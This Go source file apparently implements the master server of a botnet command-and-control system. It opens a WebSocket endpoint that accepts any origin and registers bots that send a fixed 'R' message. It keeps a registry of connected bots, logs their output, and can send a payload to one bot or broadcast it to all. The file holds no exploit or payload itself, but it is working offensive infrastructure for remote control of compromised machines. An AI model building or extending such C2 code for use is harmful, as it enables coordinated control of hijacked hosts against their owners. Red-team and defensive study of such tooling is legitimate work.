package c2

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"

	"github.com/gorilla/websocket"
)

// C2 Master script that manages Bot Websocket connections. It spins up an HTTP server to provide an endpoint
// for bots to reach and establish WS handshake

// Structure of payload for outbound messages to registered bots. Master already knows bots' IP
type Message struct {
	Payload string `json:"payload"`
}

type Bot struct {
	Addr string
	Conn *websocket.Conn
	Mu   sync.Mutex
}

// Master struct that keeps track of bot connections, using IPs as keys
type Master struct {
	bots sync.Map
}

var upgrader = websocket.Upgrader{ // Upgrades connection to WS
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

func NewMaster() *Master {
	return &Master{}
}

func (m *Master) Serve(addr string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/connect", m.handleBot)

	log.Printf("C2 HTTP Server listening on %s\n", addr)
	return http.ListenAndServe(addr, mux)
}

// Handler for inbound bot registrations. Master validates message payload and bot IP before storing them into
// bot registry
func (m *Master) handleBot(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("Failed to upgrade WS connection: %v\n", err)
		return
	}

	_, data, err := conn.ReadMessage()
	if err != nil {
		conn.Close()
		return
	}

	var msg struct {
		Payload string `json:"payload"`
		From    string `json:"from"`
	}

	// Master expects a specific message from Bot for registration
	if err := json.Unmarshal(data, &msg); err != nil || msg.Payload != "R" || msg.From == "" {
		log.Printf("Invalid registration received from %v! Received: %s\n", conn.RemoteAddr(), msg.Payload)
		conn.Close()
		return
	}

	// Stores newly registered bot, overwritting same IDs
	bot := &Bot{Addr: msg.From, Conn: conn}
	if old, loaded := m.bots.LoadOrStore(msg.From, bot); loaded {
		oldBot := old.(*Bot) // Casting because value is originally of type "Any"
		oldBot.Conn.Close()

		m.bots.Store(msg.From, bot)
	}

	log.Printf("[+] Bot Connected: %s\n", msg.From)

	// Graceful termination
	defer func() {
		m.bots.Delete(msg.From)
		conn.Close()

		log.Printf("[-] Bot Disconnected: %s\n", msg.From)
	}()

	// Keeping the connection alive
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}

		var incoming Message
		if err := json.Unmarshal(data, &incoming); err != nil {
			continue
		}

		log.Printf("[%s] %s", msg.From, incoming.Payload)
	}
}

// Sends a payload to a single bot
func (m *Master) send(bot *Bot, payload string) error {
	bot.Mu.Lock()
	defer bot.Mu.Unlock()

	return bot.Conn.WriteJSON(Message{Payload: payload})
}

// Sends a payload to all bots
func (m *Master) broadcast(payload string) error {
	var wg sync.WaitGroup

	m.bots.Range(func(_, value any) bool {
		bot := value.(*Bot)
		wg.Add(1)

		go func() {
			defer wg.Done()

			if err := m.send(bot, payload); err != nil {
				log.Printf("[!] Failed to send payload (%s) to %s: %v\n", payload, bot.Addr, err)
				return
			}

			log.Printf("[✓] %s ← %s \n", bot.Addr, payload)
		}()

		return true
	})

	wg.Wait() // Waits for everyone to finish (Blocking fashion)
	return nil
}

// Outputs to stdout a list of connected bots that the Master can send WS messages to
func (m *Master) list() error {
	fmt.Println("Active Connections: ")

	m.bots.Range(func(_, value any) bool {
		bot := value.(*Bot)
		fmt.Printf("\t%s\n", bot.Addr)

		return true
	})

	return nil
}
